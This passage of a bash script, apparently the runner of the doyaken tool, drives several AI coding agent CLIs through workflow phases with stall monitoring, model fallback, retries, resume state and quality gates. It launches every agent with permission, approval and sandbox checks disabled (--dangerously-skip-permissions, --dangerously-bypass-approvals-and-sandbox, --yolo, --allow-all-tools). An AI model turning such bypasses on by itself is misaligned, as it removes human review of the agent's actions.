    local last_activity_time
    last_activity_time=$(date +%s)
    local start_time
    start_time=$(date +%s)
    local stall_warned=0

    echo -e "${DIM}[$AGENT_ID MONITOR]${NC} ${phase_name} 00:00 │ ⋯ waiting for agent response..."

    while true; do
      sleep "$PHASE_MONITOR_INTERVAL" &
      wait $! 2>/dev/null || exit 0

      local now
      now=$(date +%s)
      local elapsed=$(( now - start_time ))
      local mins=$(( elapsed / 60 ))
      local secs=$(( elapsed % 60 ))

      # Check log file size
      local current_size=0
      if [ -f "$phase_log" ]; then
        current_size=$(wc -c < "$phase_log" 2>/dev/null || echo 0)
        current_size="${current_size##* }"  # trim whitespace (macOS wc)
      fi

      # Check for new output
      if [ "$current_size" -gt "$last_size" ]; then
        local new_bytes=$(( current_size - last_size ))
        last_activity_time=$now
        stall_warned=0

        # Human-readable size
        local size_display
        if [ "$current_size" -gt 1048576 ]; then
          size_display="$(( current_size / 1048576 ))MB"
        elif [ "$current_size" -gt 1024 ]; then
          size_display="$(( current_size / 1024 ))KB"
        else
          size_display="${current_size}B"
        fi

        echo -e "${DIM}[$AGENT_ID MONITOR]${NC} ${phase_name} $(printf '%02d:%02d' "$mins" "$secs") │ ✓ active (+${new_bytes}B, ${size_display} total)"
        last_size=$current_size
      else
        local stall_time=$(( now - last_activity_time ))

        if [ "$stall_time" -ge "$PHASE_STALL_THRESHOLD" ]; then
          local stall_mins=$(( stall_time / 60 ))
          local stall_secs=$(( stall_time % 60 ))

          if [ "$stall_warned" -eq 0 ]; then
            echo -e "${YELLOW}[$AGENT_ID MONITOR]${NC} ${phase_name} $(printf '%02d:%02d' "$mins" "$secs") │ ⚠ NO OUTPUT for ${stall_mins}m${stall_secs}s (log: ${current_size} bytes)"
            echo -e "${YELLOW}[$AGENT_ID MONITOR]${NC}   Agent may be stuck, thinking, or waiting for API response"
            echo -e "${YELLOW}[$AGENT_ID MONITOR]${NC}   Log: $phase_log"
            stall_warned=1
          else
            # Repeat warning every stall_threshold interval
            echo -e "${YELLOW}[$AGENT_ID MONITOR]${NC} ${phase_name} $(printf '%02d:%02d' "$mins" "$secs") │ ⚠ STILL NO OUTPUT (${stall_mins}m${stall_secs}s silent)"
          fi
        else
          echo -e "${DIM}[$AGENT_ID MONITOR]${NC} ${phase_name} $(printf '%02d:%02d' "$mins" "$secs") │ ⋯ waiting (${stall_time}s since last output)"
        fi
      fi

      # Warn when approaching timeout
      local remaining=$(( timeout - elapsed ))
      if [ "$remaining" -le 120 ] && [ "$remaining" -gt 0 ]; then
        echo -e "${RED}[$AGENT_ID MONITOR]${NC} ${phase_name} │ ⚠ TIMEOUT in ${remaining}s!"
      fi
    done
  ) &
  PHASE_MONITOR_PID=$!
}

stop_phase_monitor() {
  if [ -n "$PHASE_MONITOR_PID" ] && kill -0 "$PHASE_MONITOR_PID" 2>/dev/null; then
    kill "$PHASE_MONITOR_PID" 2>/dev/null || true
    wait "$PHASE_MONITOR_PID" 2>/dev/null || true
  fi
  PHASE_MONITOR_PID=""
}

# ============================================================================
# Model Fallback (opus -> sonnet on rate limits)
# ============================================================================

fallback_to_sonnet() {
  if [ "$AGENT_NO_FALLBACK" = "1" ]; then
    log_warn "Model fallback disabled (AGENT_NO_FALLBACK=1)"
    return 1
  fi

  # Agent-specific fallback logic
  case "$CURRENT_AGENT" in
    claude)
      if [ "$CURRENT_MODEL" = "sonnet" ] || [ "$CURRENT_MODEL" = "haiku" ]; then
        log_warn "Already using $CURRENT_MODEL, cannot fall back further"
        return 1
      fi
      log_model "Falling back from $CURRENT_MODEL to sonnet due to rate limits"
      CURRENT_MODEL="sonnet"
      ;;
    codex)
      if [ "$CURRENT_MODEL" = "o4-mini" ]; then
        log_warn "Already using o4-mini, cannot fall back further"
        return 1
      fi
      log_model "Falling back from $CURRENT_MODEL to o4-mini due to rate limits"
      CURRENT_MODEL="o4-mini"
      ;;
    gemini)
      if [ "$CURRENT_MODEL" = "gemini-2.5-flash" ]; then
        log_warn "Already using gemini-2.5-flash, cannot fall back further"
        return 1
      fi
      log_model "Falling back from $CURRENT_MODEL to gemini-2.5-flash due to rate limits"
      CURRENT_MODEL="gemini-2.5-flash"
      ;;
    copilot)
      if [ "$CURRENT_MODEL" = "claude-sonnet-4" ]; then
        log_warn "Already using claude-sonnet-4, cannot fall back further"
        return 1
      fi
      log_model "Falling back from $CURRENT_MODEL to claude-sonnet-4 due to rate limits"
      CURRENT_MODEL="claude-sonnet-4"
      ;;
    opencode)
      if [ "$CURRENT_MODEL" = "claude-sonnet-4" ]; then
        log_warn "Already using claude-sonnet-4, cannot fall back further"
        return 1
      fi
      log_model "Falling back from $CURRENT_MODEL to claude-sonnet-4 due to rate limits"
      CURRENT_MODEL="claude-sonnet-4"
      ;;
    *)
      log_warn "Unknown agent $CURRENT_AGENT, cannot fall back"
      return 1
      ;;
  esac

  MODEL_FALLBACK_TRIGGERED=1
  return 0
}

reset_model() {
  if [ "$MODEL_FALLBACK_TRIGGERED" = "1" ]; then
    log_model "Resetting model back to $DOYAKEN_MODEL after successful run"
    CURRENT_MODEL="$DOYAKEN_MODEL"
    MODEL_FALLBACK_TRIGGERED=0
  fi
}

# ============================================================================
# Phase Execution (Modular Workflow)
# ============================================================================

build_phase_prompt() {
  local prompt_file="$1"
  local task_id="$2"
  local task_prompt="$3"
  local timestamp
  timestamp=$(date '+%Y-%m-%d %H:%M')

  # Find prompt file (project first, then global)
  local prompt_path
  prompt_path=$(get_prompt_file "$prompt_file") || {
    log_error "Prompt file not found: $prompt_file (checked project and global)"
    return 1
  }

  local template
  template=$(cat "$prompt_path")

  # Context variables for downstream phases (4-test through 7-verify)
  # These give later phases visibility into what earlier phases changed
  local recent_commits="" changed_files="" task_commits=""
  if [[ "$prompt_file" == *"review"* ]] || [[ "$prompt_file" == *"verify"* ]]; then
    recent_commits=$(git log --oneline -10 2>/dev/null || echo "(no commits yet)")
  fi
  if [[ "$prompt_file" == *"test"* ]] || [[ "$prompt_file" == *"docs"* ]] || \
     [[ "$prompt_file" == *"review"* ]] || [[ "$prompt_file" == *"verify"* ]]; then
    changed_files=$(git diff main...HEAD --name-only 2>/dev/null | head -30 || echo "(unable to determine)")
    task_commits=$(git log --oneline -15 2>/dev/null || echo "(no commits yet)")
  fi

  # Accumulated context from previous verification attempts
  local context_file
  context_file=$(get_context_file "$task_id")
  local accumulated_context=""
  [ -f "$context_file" ] && accumulated_context=$(cat "$context_file")

  local prompt="$template"
  prompt="${prompt//\{\{TASK_ID\}\}/$task_id}"
  prompt="${prompt//\{\{TASK_PROMPT\}\}/$task_prompt}"
  # Legacy support: resolve {{TASK_FILE}} to empty (no longer used)
  prompt="${prompt//\{\{TASK_FILE\}\}/}"
  prompt="${prompt//\{\{TIMESTAMP\}\}/$timestamp}"
  prompt="${prompt//\{\{RECENT_COMMITS\}\}/$recent_commits}"
  prompt="${prompt//\{\{CHANGED_FILES\}\}/$changed_files}"
  prompt="${prompt//\{\{TASK_COMMITS\}\}/$task_commits}"
  prompt="${prompt//\{\{AGENT_ID\}\}/$AGENT_ID}"
  prompt="${prompt//\{\{ACCUMULATED_CONTEXT\}\}/$accumulated_context}"
  prompt="${prompt//\{\{VERIFICATION_CONTEXT\}\}/${PHASE_VERIFICATION_CONTEXT:-}}"

  # Process {{include:path}} directives
  prompt=$(process_includes "$prompt")

  echo "$prompt"
}

run_phase_once() {
  local phase_name="$1"
  local prompt_file="$2"
  local timeout="$3"
  local task_id="$4"
  local task_prompt="$5"
  local attempt="$6"
  local phase_idx="${7:-}"
  local total_phases="${8:-}"
  local phase_name_lower
  phase_name_lower=$(echo "$phase_name" | tr '[:upper:]' '[:lower:]')
  local phase_log="$RUN_LOG_DIR/phase-${phase_name_lower}-$task_id-attempt${attempt}.log"

  # Build phase label with index for clear identification
  local phase_label="$phase_name"
  if [ -n "$phase_idx" ] && [ -n "$total_phases" ]; then
    phase_label="[$phase_idx/$total_phases] $phase_name"
  fi

  log_phase "Starting $phase_label phase (attempt $attempt)"
  echo "  Agent: $CURRENT_AGENT"
  echo "  Model: $CURRENT_MODEL"
  echo "  Timeout: ${timeout}s"
  echo "  Log: $phase_log"

  local prompt build_result=0
  prompt=$(build_phase_prompt "$prompt_file" "$task_id" "$task_prompt") || build_result=$?
  if [ "$build_result" -ne 0 ]; then
    log_error "Failed to build prompt for $phase_name (prompt file: $PROMPTS_DIR/$prompt_file)"
    return 1
  fi

  local output_mode="stream"
  if [ "$AGENT_QUIET" = "1" ]; then
    output_mode="quiet"
  elif [ "$AGENT_PROGRESS" = "1" ]; then
    output_mode="progress"
  fi

  local exit_code=0

  # Proactive rate limit check before agent invocation
  if declare -f rate_limit_check &>/dev/null; then
    local rl_result=0
    rate_limit_check "$phase_name" || rl_result=$?
    if [ "$rl_result" -ne 0 ]; then
      log_warn "Rate limit wait interrupted — aborting $phase_name"
      return 130
    fi
  fi

  echo ""
  echo -e "${CYAN}┌─────────────────────────────────────────────────────────────┐${NC}"
  echo -e "${CYAN}│${NC} ${BOLD}PHASE: $phase_label (attempt $attempt) [$CURRENT_AGENT]${NC}"
  echo -e "${CYAN}└─────────────────────────────────────────────────────────────┘${NC}"
  echo ""

  # Start phase monitor (checks for stuck agents)
  start_phase_monitor "$phase_name" "$phase_log" "$timeout"

  # Build timeout prefix
  # --foreground: prevents timeout from creating a new process group, which
  # would cause the child to lose TTY access and get stopped (SIGTTIN/SIGTTOU).
  # Without this, the agent process hangs silently in pipelines.
  local timeout_cmd=""
  if command -v gtimeout &> /dev/null; then
    timeout_cmd="gtimeout --foreground"
  elif command -v timeout &> /dev/null; then
    timeout_cmd="timeout --foreground"
  fi

  # Record invocation for rate limiting
  if declare -f rate_limit_record &>/dev/null; then
    rate_limit_record
  fi

  echo -e "${DIM}[$AGENT_ID]${NC} Launching $CURRENT_AGENT agent for $phase_label..."

  # Build agent command using abstraction functions
  # Each agent uses its correct autonomous mode flags
  local agent_args=()

  case "$CURRENT_AGENT" in
    claude)
      # Claude: --dangerously-skip-permissions --permission-mode bypassPermissions --model <model>
      agent_args+=("--dangerously-skip-permissions")
      agent_args+=("--permission-mode" "bypassPermissions")
      [ -n "$CURRENT_MODEL" ] && agent_args+=("--model" "$CURRENT_MODEL")
      if [ "$output_mode" != "quiet" ]; then
        agent_args+=("--output-format" "stream-json" "--verbose")
      fi
      # Add any pass-through args
      if [ ${#DOYAKEN_PASSTHROUGH_ARGS[@]} -gt 0 ]; then
        agent_args+=("${DOYAKEN_PASSTHROUGH_ARGS[@]}")
      fi
      agent_args+=("-p" "$prompt")

      if [ "$output_mode" = "progress" ]; then
        if [ -n "$timeout_cmd" ]; then
          $timeout_cmd "${timeout}s" claude "${agent_args[@]}" 2>&1 | tee "$phase_log" | progress_filter "$phase_label" || exit_code=$?
        else
          claude "${agent_args[@]}" 2>&1 | tee "$phase_log" | progress_filter "$phase_label" || exit_code=$?
        fi
      else
        if [ -n "$timeout_cmd" ]; then
          $timeout_cmd "${timeout}s" claude "${agent_args[@]}" 2>&1 | tee "$phase_log" || exit_code=$?
        else
          claude "${agent_args[@]}" 2>&1 | tee "$phase_log" || exit_code=$?
        fi
      fi
      ;;

    codex)
      # Codex: codex exec --dangerously-bypass-approvals-and-sandbox -m <model> <prompt>
      agent_args+=("exec")
      agent_args+=("--dangerously-bypass-approvals-and-sandbox")
      [ -n "$CURRENT_MODEL" ] && agent_args+=("-m" "$CURRENT_MODEL")
      if [ "$output_mode" != "quiet" ]; then
        agent_args+=("--verbose")
      fi
      # Add any pass-through args
      if [ ${#DOYAKEN_PASSTHROUGH_ARGS[@]} -gt 0 ]; then
        agent_args+=("${DOYAKEN_PASSTHROUGH_ARGS[@]}")
      fi
      agent_args+=("$prompt")

      if [ -n "$timeout_cmd" ]; then
        $timeout_cmd "${timeout}s" codex "${agent_args[@]}" 2>&1 | tee "$phase_log" || exit_code=$?
      else
        codex "${agent_args[@]}" 2>&1 | tee "$phase_log" || exit_code=$?
      fi
      ;;

    gemini)
      # Gemini: gemini --yolo -m <model> -p <prompt>
      agent_args+=("--yolo")
      [ -n "$CURRENT_MODEL" ] && agent_args+=("-m" "$CURRENT_MODEL")
      if [ "$output_mode" != "quiet" ]; then
        agent_args+=("--verbose")
      fi
      # Add any pass-through args
      if [ ${#DOYAKEN_PASSTHROUGH_ARGS[@]} -gt 0 ]; then
        agent_args+=("${DOYAKEN_PASSTHROUGH_ARGS[@]}")
      fi
      agent_args+=("-p" "$prompt")

      if [ -n "$timeout_cmd" ]; then
        $timeout_cmd "${timeout}s" gemini "${agent_args[@]}" 2>&1 | tee "$phase_log" || exit_code=$?
      else
        gemini "${agent_args[@]}" 2>&1 | tee "$phase_log" || exit_code=$?
      fi
      ;;

    copilot)
      # Copilot: copilot --allow-all-tools --allow-all-paths -m <model> -p <prompt>
      agent_args+=("--allow-all-tools")
      agent_args+=("--allow-all-paths")
      [ -n "$CURRENT_MODEL" ] && agent_args+=("-m" "$CURRENT_MODEL")
      if [ "$output_mode" != "quiet" ]; then
        agent_args+=("--verbose")
      fi
      # Add any pass-through args
      if [ ${#DOYAKEN_PASSTHROUGH_ARGS[@]} -gt 0 ]; then
        agent_args+=("${DOYAKEN_PASSTHROUGH_ARGS[@]}")
      fi
      agent_args+=("-p" "$prompt")

      if [ -n "$timeout_cmd" ]; then
        $timeout_cmd "${timeout}s" copilot "${agent_args[@]}" 2>&1 | tee "$phase_log" || exit_code=$?
      else
        copilot "${agent_args[@]}" 2>&1 | tee "$phase_log" || exit_code=$?
      fi
      ;;

    opencode)
      # OpenCode: opencode run --auto-approve --model <model> <prompt>
      agent_args+=("run")
      agent_args+=("--auto-approve")
      [ -n "$CURRENT_MODEL" ] && agent_args+=("--model" "$CURRENT_MODEL")
      if [ "$output_mode" != "quiet" ]; then
        agent_args+=("--print-logs")
      fi
      # Add any pass-through args
      if [ ${#DOYAKEN_PASSTHROUGH_ARGS[@]} -gt 0 ]; then
        agent_args+=("${DOYAKEN_PASSTHROUGH_ARGS[@]}")
      fi
      agent_args+=("$prompt")

      if [ -n "$timeout_cmd" ]; then
        $timeout_cmd "${timeout}s" opencode "${agent_args[@]}" 2>&1 | tee "$phase_log" || exit_code=$?
      else
        opencode "${agent_args[@]}" 2>&1 | tee "$phase_log" || exit_code=$?
      fi
      ;;

    *)
      log_error "Unknown agent: $CURRENT_AGENT"
      return 1
      ;;
  esac

  # Stop phase monitor
  stop_phase_monitor

  # If pipeline was killed by SIGINT (Ctrl+C), propagate the signal
  if [ "$exit_code" -eq 130 ] || [ "$INTERRUPTED" = "1" ]; then
    log_warn "$phase_name interrupted by user"
    return 130
  fi

  echo ""
  echo -e "${CYAN}└─────────────────────────────────────────────────────────────┘${NC}"
  echo ""

  case $exit_code in
    0)
      log_phase "$phase_name completed successfully"
      return 0
      ;;
    124)
      log_error "$phase_name timed out after ${timeout}s"
      return 124
      ;;
    *)
      if grep -qiE "rate.?limit|overloaded|429|502|503|504|capacity|quota" "$phase_log" 2>/dev/null; then
        log_heal "Rate limit detected in $phase_name"
        if fallback_to_sonnet; then
          log_heal "Will retry $phase_name with fallback model"
        fi
        return 2
      fi
      log_error "$phase_name failed with exit code $exit_code"
      return 1
      ;;
  esac
}

run_phase() {
  local phase_name="$1"
  local prompt_file="$2"
  local timeout="$3"
  local skip="$4"
  local task_id="$5"
  local task_prompt="$6"
  local phase_idx="${7:-}"
  local total_phases="${8:-}"

  if [ "$skip" = "1" ]; then
    log_phase "Skipping $phase_name (disabled)"
    if declare -f progress_phase_skip &>/dev/null; then
      progress_phase_skip "$phase_name"
    fi
    return 0
  fi

  # Run before-phase skill hooks
  run_skill_hooks "BEFORE" "$phase_name"

  local attempt=1
  local max_attempts="$AGENT_MAX_RETRIES"

  while [ "$attempt" -le "$max_attempts" ]; do
    local result=0
    run_phase_once "$phase_name" "$prompt_file" "$timeout" "$task_id" "$task_prompt" "$attempt" "$phase_idx" "$total_phases" || result=$?

    case $result in
      0)
        # Run after-phase skill hooks
        run_skill_hooks "AFTER" "$phase_name"
        return 0
        ;;
      130)
        # User interrupt (Ctrl+C) - propagate immediately, don't retry
        return 130
        ;;
      124)
        log_error "$phase_name timed out - consider increasing TIMEOUT_${phase_name}"
        return 1
        ;;
      2)
        if [ "$attempt" -lt "$max_attempts" ]; then
          local backoff=$((AGENT_RETRY_DELAY * attempt))
          log_heal "Retrying $phase_name in ${backoff}s (attempt $((attempt + 1))/$max_attempts)"
          sleep "$backoff"
        fi
        ;;
      *)
        if [ "$attempt" -lt "$max_attempts" ]; then
          local backoff=$((AGENT_RETRY_DELAY * attempt))
          log_heal "Retrying $phase_name in ${backoff}s (attempt $((attempt + 1))/$max_attempts)"
          sleep "$backoff"
        fi
        ;;
    esac

    ((++attempt))
  done

  log_error "$phase_name failed after $max_attempts attempts - check logs: $RUN_LOG_DIR/phase-*"
  return 1
}

run_all_phases() {
  local task_id="$1"
  local task_prompt="$2"

  log_info "Running ${#PHASES[@]} phases for task: $task_id"

  # Initialize progress tracking
  if declare -f progress_init_phases &>/dev/null; then
    progress_init_phases "$task_id" "$CURRENT_MODEL"
  fi

  # Check for phase-level resume (skip already-completed phases)
  local resume_from_phase=0
  resume_from_phase=$(load_phase_progress "$task_id") || true

  local phase_idx=0
  local total_phases=${#PHASES[@]}
  for phase_def in "${PHASES[@]}"; do
    ((++phase_idx))
    # Check for interrupt before starting next phase
    if [ "$INTERRUPTED" = "1" ]; then
      log_warn "Interrupted - stopping phase execution"
      status_line_clear 2>/dev/null || true
      return 130
    fi

    IFS='|' read -r name prompt_file timeout skip <<< "$phase_def"

    # Skip phases that already completed in a previous run
    if [ "$phase_idx" -le "$resume_from_phase" ]; then
      log_phase "Skipping $name (completed in previous run)"
      if declare -f progress_phase_done &>/dev/null; then
        progress_phase_done "$name"
      fi
      continue
    fi

    # Check if this phase should be skipped due to approval gate
    if [ "${APPROVAL_SKIP_NEXT:-0}" = "1" ]; then
      APPROVAL_SKIP_NEXT=0
      log_phase "Skipping $name (user requested)"
      if declare -f progress_phase_skip &>/dev/null; then
        progress_phase_skip "$name"
      fi
      continue
    fi

    # Track phase start
    if declare -f progress_phase_start &>/dev/null; then
      progress_phase_start "$name"
    fi

    local phase_result=0
    run_phase_with_verification "$name" "$prompt_file" "$timeout" "$skip" "$task_id" "$task_prompt" "$phase_idx" "$total_phases" || phase_result=$?

    if [ "$phase_result" -eq 130 ]; then
      status_line_clear 2>/dev/null || true
      return 130
    elif [ "$phase_result" -eq 3 ]; then
      log_error "Phase $name exhausted verification budget - needs human input"
      log_info "Re-run 'dk run' with the same prompt to resume from this phase"
      status_line_clear 2>/dev/null || true
      return 1
    elif [ "$phase_result" -ne 0 ]; then
      log_error "Phase $name failed - stopping task execution"
      status_line_clear 2>/dev/null || true
      return 1
    fi

    # Track phase completion and save progress for resume
    if declare -f progress_phase_done &>/dev/null; then
      progress_phase_done "$name"
    fi
    save_phase_progress "$task_id" "$phase_idx" "$name"

    # Approval gate between phases
    if declare -f approval_gate &>/dev/null; then
      local gate_result=0
      approval_gate "$name" "$task_id" || gate_result=$?
      case "$gate_result" in
        1) return 1 ;;  # abort/pause
        2) APPROVAL_SKIP_NEXT=1 ;;  # skip next
      esac
    fi

    sleep 1
  done

  # All phases done - clear phase progress state
  clear_phase_progress

  status_line_clear 2>/dev/null || true
  log_success "All phases completed for task: $task_id"
  return 0
}

# ============================================================================
# State Management (Self-Healing)
# ============================================================================

init_state() {
  mkdir -p "$STATE_DIR"
  chmod 700 "$STATE_DIR"
  mkdir -p "$RUN_LOG_DIR"
  chmod 700 "$RUN_LOG_DIR"
  # Auto-rotate old logs (>7 days)
  find "$LOGS_DIR" -maxdepth 1 -type d -mtime +7 ! -name 'logs' -exec rm -rf {} + 2>/dev/null || true
}

save_session() {
  local session_id="$1"
  local status="$2"
  local session_file="$STATE_DIR/session-$AGENT_ID"

  cat > "$session_file" << EOF
SESSION_ID="$session_id"
AGENT_ID="$AGENT_ID"
STATUS="$status"
TIMESTAMP="$(date '+%Y-%m-%d %H:%M:%S')"
MODEL="${DOYAKEN_MODEL:-opus}"
LOG_DIR="$RUN_LOG_DIR"
EOF
  log_info "Session state saved: $session_id"
}

# Save phase progress for a task (enables phase-level resume)
save_phase_progress() {
  local task_id="$1"
  local phase_idx="$2"
  local phase_name="$3"
  local progress_file="$STATE_DIR/phase-progress-$AGENT_ID"

  cat > "$progress_file" << EOF
TASK_ID="$task_id"
LAST_COMPLETED_PHASE="$phase_idx"
LAST_COMPLETED_NAME="$phase_name"
TIMESTAMP="$(date '+%Y-%m-%d %H:%M:%S')"
EOF
}

# Load phase progress for a task (returns last completed phase index, or 0)
load_phase_progress() {
  local task_id="$1"
  local progress_file="$STATE_DIR/phase-progress-$AGENT_ID"

  if [ -f "$progress_file" ] && [ "$AGENT_NO_RESUME" != "1" ]; then
    local saved_task_id saved_phase_idx saved_phase_name
    saved_task_id=$(grep '^TASK_ID=' "$progress_file" 2>/dev/null | head -1 | cut -d= -f2- | tr -d '"')
    saved_phase_idx=$(grep '^LAST_COMPLETED_PHASE=' "$progress_file" 2>/dev/null | head -1 | cut -d= -f2- | tr -d '"')
    saved_phase_name=$(grep '^LAST_COMPLETED_NAME=' "$progress_file" 2>/dev/null | head -1 | cut -d= -f2- | tr -d '"')

    if [ "$saved_task_id" = "$task_id" ] && [ -n "$saved_phase_idx" ]; then
      log_heal "Found phase progress for $task_id: completed through $saved_phase_name ($saved_phase_idx/${#PHASES[@]})"
      echo "$saved_phase_idx"
      return 0
    fi
  fi
  echo "0"
  return 1
}

# Clear phase progress (called when all phases complete or task finishes)
clear_phase_progress() {
  local progress_file="$STATE_DIR/phase-progress-$AGENT_ID"
  rm -f "$progress_file"
}

load_session() {
  local session_file="$STATE_DIR/session-$AGENT_ID"

  if [ -f "$session_file" ] && [ "$AGENT_NO_RESUME" != "1" ]; then
    # Parse session file safely instead of sourcing (prevents code injection)
    SESSION_ID=$(grep '^SESSION_ID=' "$session_file" 2>/dev/null | head -1 | cut -d= -f2- | tr -d '"')
    STATUS=$(grep '^STATUS=' "$session_file" 2>/dev/null | head -1 | cut -d= -f2- | tr -d '"')
    LOG_DIR=$(grep '^LOG_DIR=' "$session_file" 2>/dev/null | head -1 | cut -d= -f2- | tr -d '"')

    if [ -n "${SESSION_ID:-}" ] && [ "${STATUS:-}" = "running" ]; then
      log_heal "Found interrupted session: $SESSION_ID"
      return 0
    fi
  fi
  return 1
}

clear_session() {
  local session_file="$STATE_DIR/session-$AGENT_ID"
  rm -f "$session_file"
}

update_health() {
  local status="$1"
  local message="$2"
  local health_file="$STATE_DIR/health-$AGENT_ID"

  cat > "$health_file" << EOF
STATUS="$status"
MESSAGE="$message"
AGENT_ID="$AGENT_ID"
LAST_CHECK="$(date '+%Y-%m-%d %H:%M:%S')"
CONSECUTIVE_FAILURES="${CONSECUTIVE_FAILURES:-0}"
EOF
}

get_consecutive_failures() {
  local health_file="$STATE_DIR/health-$AGENT_ID"
  if [ -f "$health_file" ]; then
    grep "^CONSECUTIVE_FAILURES=" "$health_file" 2>/dev/null | cut -d= -f2 | tr -d '"' || echo "0"
  else
    echo "0"
  fi
}

# ============================================================================
# Health Checks
# ============================================================================

health_check() {
  log_step "Running health checks..."

  local issues=0
  local agent_cmd
  agent_cmd=$(agent_command "$CURRENT_AGENT")

  # Check if selected agent is installed
  if ! command -v "$agent_cmd" &> /dev/null; then
    log_error "$CURRENT_AGENT CLI ($agent_cmd) not found"
    agent_install_instructions "$CURRENT_AGENT"
    ((++issues))
  else
    log_success "$CURRENT_AGENT CLI ($agent_cmd) available"
  fi

  if command -v gtimeout &> /dev/null; then
    log_success "Timeout available (gtimeout)"
  elif command -v timeout &> /dev/null; then
    log_success "Timeout available (timeout)"
  else
    log_warn "No timeout command found (gtimeout/timeout) - phases will run without time limits"
    log_warn "Install coreutils for timeout support: brew install coreutils (macOS)"
  fi

  if [ -z "$AGENT_MD" ]; then
    log_warn "No AGENT.md or CLAUDE.md found"
  else
    log_success "Operating manual exists: $(basename "$AGENT_MD")"
  fi

  local available_kb
  available_kb=$(df -k "$PROJECT_DIR" | awk 'NR==2 {print $4}')
  if [ "$available_kb" -lt 1048576 ]; then
    log_warn "Low disk space: $((available_kb / 1024))MB available"
  else
    log_success "Disk space OK: $((available_kb / 1024))MB available"
  fi

  if [ "$issues" -gt 0 ]; then
    update_health "unhealthy" "$issues issues found"
    return 1
  fi

  update_health "healthy" "All checks passed"
  return 0
}

validate_environment() {
  log_step "Validating environment..."

  if [ -z "${DOYAKEN_PROMPT:-}" ]; then
    log_error "No prompt provided (DOYAKEN_PROMPT is empty)"
    echo "Usage: dk run \"your prompt here\""
    exit 1
  fi

  log_success "Environment validated"
}

# ============================================================================
# Verification Gates (Quality Gate Checking)
# ============================================================================

# Run a single quality gate command
# Args: gate_name, gate_cmd
# Sets: GATE_RESULT (output), returns 0=pass, 1=fail, 2=skip
_run_gate() {
  local gate_name="$1"
  local gate_cmd="$2"

  # Empty command = SKIP
  if [ -z "$gate_cmd" ]; then
    return 2
  fi

  log_info "Running gate: $gate_name ($gate_cmd)"

  local gate_output exit_code=0
  local timeout_cmd=""
  if command -v gtimeout &>/dev/null; then
    timeout_cmd="gtimeout --foreground"
  elif command -v timeout &>/dev/null; then
    timeout_cmd="timeout --foreground"
  fi

  if [ -n "$timeout_cmd" ]; then
    gate_output=$($timeout_cmd 300s bash -c "cd '$PROJECT_DIR' && $gate_cmd" 2>&1 | tail -50) || exit_code=$?
  else
    gate_output=$(bash -c "cd '$PROJECT_DIR' && $gate_cmd" 2>&1 | tail -50) || exit_code=$?
  fi

  GATE_RESULT="$gate_output"

  if [ "$exit_code" -eq 0 ]; then
    log_success "Gate $gate_name: PASS"
    return 0
  else
    log_warn "Gate $gate_name: FAIL (exit $exit_code)"
    return 1
  fi
}

# Run verification gates for a phase
# Args: phase_name
# Returns: 0=all pass (or all skipped), 1=at least one failed
# Sets: GATE_ERRORS (combined error output)
run_verification_gates() {
  local phase_name="$1"
  local any_failed=0
  local any_configured=0
  GATE_ERRORS=""

  # All phases run all configured quality gates.
  # Gates with empty commands are automatically skipped.
  local gates=(
    "build:${QUALITY_BUILD_CMD:-}"
    "lint:${QUALITY_LINT_CMD:-}"
    "format:${QUALITY_FORMAT_CMD:-}"
    "test:${QUALITY_TEST_CMD:-}"
  )

  local gate_results=""
  for gate_entry in "${gates[@]}"; do
    local gate_name="${gate_entry%%:*}"
    local gate_cmd="${gate_entry#*:}"

    local gate_rc=0
    GATE_RESULT=""
    _run_gate "$gate_name" "$gate_cmd" || gate_rc=$?

    case "$gate_rc" in
      0) gate_results="${gate_results}${gate_name}=PASS " ;;
      1)
        gate_results="${gate_results}${gate_name}=FAIL "
        GATE_ERRORS="${GATE_ERRORS}--- ${gate_name} ---\n${GATE_RESULT}\n\n"
        any_failed=1
        any_configured=1
        ;;
      2) gate_results="${gate_results}${gate_name}=SKIP " ;;
    esac

    # Track that at least one gate was configured (not skipped)
    if [ "$gate_rc" -eq 0 ]; then
      any_configured=1
    fi
  done

  if [ "$any_configured" -eq 0 ]; then
    log_info "No quality gates configured - pass-through"
    return 0
  fi

  log_info "Gate results: $gate_results"

  if [ "$any_failed" -eq 1 ]; then
    return 1
  fi
  return 0
}

# Run a phase with verification gates and retry loop
# Wraps run_phase() with gate checking and accumulated context
run_phase_with_verification() {
  local phase_name="$1"
  local prompt_file="$2"
  local timeout="$3"
  local skip="$4"
  local task_id="$5"
  local task_prompt="$6"
  local phase_idx="${7:-}"
  local total_phases="${8:-}"

  # If phase is skipped, delegate directly
  if [ "$skip" = "1" ]; then
    run_phase "$phase_name" "$prompt_file" "$timeout" "$skip" "$task_id" "$task_prompt" "$phase_idx" "$total_phases"
    return $?
  fi

  # Get retry budget for this phase
  local phase_lower
  phase_lower=$(echo "$phase_name" | tr '[:upper:]' '[:lower:]')
  local budget_var="RETRY_BUDGET_${phase_name}"
  local max_verification_attempts="${!budget_var:-3}"

  local verification_attempt=1
  while [ "$verification_attempt" -le "$max_verification_attempts" ]; do
    # Check for interrupt
    if [ "$INTERRUPTED" = "1" ]; then
      return 130
    fi

    # Clear verification context for first attempt
    if [ "$verification_attempt" -eq 1 ]; then
      PHASE_VERIFICATION_CONTEXT=""
    fi

    # Run the phase (inner loop handles rate-limit retries)
    local phase_result=0
    run_phase "$phase_name" "$prompt_file" "$timeout" "$skip" "$task_id" "$task_prompt" "$phase_idx" "$total_phases" || phase_result=$?

    # Propagate interrupt
    if [ "$phase_result" -eq 130 ]; then
      return 130
    fi

    # Phase failed at the agent level (not gate level)
    if [ "$phase_result" -ne 0 ]; then
      return "$phase_result"
    fi

    # Phase succeeded - now run verification gates
    local gate_result=0
    run_verification_gates "$phase_name" || gate_result=$?

    if [ "$gate_result" -eq 0 ]; then
      # All gates passed
      log_success "$phase_name verification gates passed"
      return 0
    fi

    # Gates failed - prepare context for retry
    if [ "$verification_attempt" -lt "$max_verification_attempts" ]; then
      log_warn "$phase_name verification failed (attempt $verification_attempt/$max_verification_attempts) - retrying with error context"

      # Build verification context for next attempt
      PHASE_VERIFICATION_CONTEXT="VERIFICATION FAILURE (attempt $verification_attempt/$max_verification_attempts):
The previous $phase_name attempt completed but quality gates FAILED.
Fix these errors before proceeding:

$(echo -e "$GATE_ERRORS")"

      # Append to accumulated context
      append_phase_context "$task_id" "$phase_name" "$verification_attempt" \
        "Gate failures:\n$(echo -e "$GATE_ERRORS" | head -30)"
    fi

    ((++verification_attempt))
  done

  # All verification attempts exhausted
  log_error "$phase_name failed verification after $max_verification_attempts attempts"
  log_info "Check logs: $RUN_LOG_DIR"
  return 3  # Needs human input
}

# ============================================================================
# Context Tracking
# ============================================================================

# Get path to context file for a task
